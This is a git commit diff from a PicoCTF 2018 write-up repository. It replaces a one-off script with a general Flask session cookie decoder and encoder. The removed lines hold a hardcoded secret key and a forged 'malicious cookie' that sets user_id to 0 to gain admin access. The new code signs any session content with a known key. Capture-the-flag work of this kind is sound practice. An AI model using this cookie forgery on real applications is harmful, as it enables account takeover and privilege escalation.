1fc474fbda00e769716ef691f262a11eb12fbb1c
Saskia Hiltemann <zazkia@gmail.com>
2018-10-25 13:57:12 +0200

    update code

--- PicoCTF_2018/writeupfiles/flask_session_cookie_manager.py
+++ PicoCTF_2018/writeupfiles/flask_session_cookie_manager.py
@@ -1,61 +1,101 @@
-from itsdangerous import base64_decode, base64_encode
+""" Flask Session Cookie Decoder/Encoder """
+__author__ = 'Wilson Sumanang, Alexandre ZANNI'
+
+# standard imports
+import sys
 import zlib
+from itsdangerous import base64_decode
+import ast
 
-from itsdangerous import Signer
-from itsdangerous import JSONWebSignatureSerializer
+# Lib for argument parsing
+import argparse
 
-def decrypt(cookie):
-    """Decode a Flask cookie."""
+# Description for help
+parser = argparse.ArgumentParser(
+            description='Flask Session Cookie Decoder/Encoder',
+            epilog="Author : Wilson Sumanang, Alexandre ZANNI")
+
+# prepare sub commands
+subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')
+
+# create the parser for the encode command
+parser_encode = subparsers.add_parser('encode', help='encode')
+parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
+                            help='Secret key', required=True)
+parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
+                            help='Session cookie structure', required=True)
+
+# create the parser for the decode command
+parser_decode = subparsers.add_parser('decode', help='decode')
+parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
+                            help='Secret key', required=False)
+parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
+                            help='Session cookie value', required=True)
+
+# get args
+args = parser.parse_args()
+
+# external Imports
+from flask.sessions import SecureCookieSessionInterface
+
+
+class MockApp(object):
+
+    def __init__(self, secret_key):
+        self.secret_key = secret_key
+
+
+def session_cookie_encoder(secret_key, session_cookie_structure):
+    """ Encode a Flask session cookie """
     try:
-        compressed = False
-        payload = cookie
+        app = MockApp(secret_key)
 
-        if payload.startswith('.'):
-            compressed = True
-            payload = payload[1:]
+        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+        si = SecureCookieSessionInterface()
+        s = si.get_signing_serializer(app)
 
-        data = payload.split(".")[0]
-
-        data = base64_decode(data)
-        if compressed:
-            data = zlib.decompress(data)
-
-        return data.decode("utf-8")
+        return s.dumps(session_cookie_structure)
     except Exception as e:
-        return "[Decoding error: are you sure this was a Flask session cookie? {}]".format(e)
-
-def encrypt(cookie, secret_key):
-    compress = True
-    if compress:
-        data = zlib.compress(cookie)
-    data = base64_encode(data)
-
-    s = Signer(secret_key) # key_derivation = concat|django-concat|hmac
-    signature = s.get_signature(cookie)
-    data += '.' + signature
-
-    # or sign the compressed / b64 encoded data?
-    #data = s.sign(data)
-
-    if compress: # if compression used, prefix string with a period
-        data = '.' + data
-
-    return data
-
-cookie = '.eJwlj8uKwzAMAP_F5xxsvSL3Z4JsSWwp7ELSnkr_vYa9z8DMuxx5xvVTbs_zFVs57l5uxRwDe6Vahcl2Ms0KXMUoh6I7IgE0HcSufYoKx0DHXcOYwKlPlkRAi-GZqYCcjEkBOVO7GUwOttaWbHtomzarTfLWxapj2cq8zjyef4_4XT0LVhBpwIyqMnqb3HRXRKUBoqQ-Vkwu73XF-T_Ravl8Aa_JPmw.DrIbMQ.mLvNGriozmsC4ufO9lqGP44D340'
-
-cookie_plain = '{"_fresh":true,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"10"}'
+        return "[Encoding error]{}".format(e)
 
 
-cookie_exploit = '{"_fresh":true,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"0"}'
+def session_cookie_decoder(session_cookie_value, secret_key=None):
+    """ Decode a Flask cookie  """
+    try:
+        if(secret_key==None):
+            compressed = False
+            payload = session_cookie_value
 
-secret_key = '385c16dd09098b011d0086f9e218a0a2'
-#secret_key = base64_decode('OFwW3QkJiwEdAIb54higog==')
+            if payload.startswith(b'.'):
+                compressed = True
+                payload = payload[1:]
 
-print(decrypt(cookie))
-print(encrypt(cookie_plain, secret_key)) # see if we can get our own cookie back
+            data = payload.split(".")[0]
 
-# encode our malicious cookie
-print(encrypt(cookie_exploit, secret_key))
+            data = base64_decode(data)
+            if compressed:
+                data = zlib.decompress(data)
 
+            return data
+        else:
+            app = MockApp(secret_key)
+
+            si = SecureCookieSessionInterface()
+            s = si.get_signing_serializer(app)
+
+            return s.loads(session_cookie_value)
+    except Exception as e:
+        return "[Decoding error]{}".format(e)
+
+
+if __name__ == "__main__":
+    # find the option chosen
+    if(args.subcommand == 'encode'):
+        if(args.secret_key is not None and args.cookie_structure is not None):
+            print(session_cookie_encoder(args.secret_key, args.cookie_structure))
+    elif(args.subcommand == 'decode'):
+        if(args.secret_key is not None and args.cookie_value is not None):
+            print(session_cookie_decoder(args.cookie_value,args.secret_key))
+        elif(args.cookie_value is not None):
+            print(session_cookie_decoder(args.cookie_value))
 
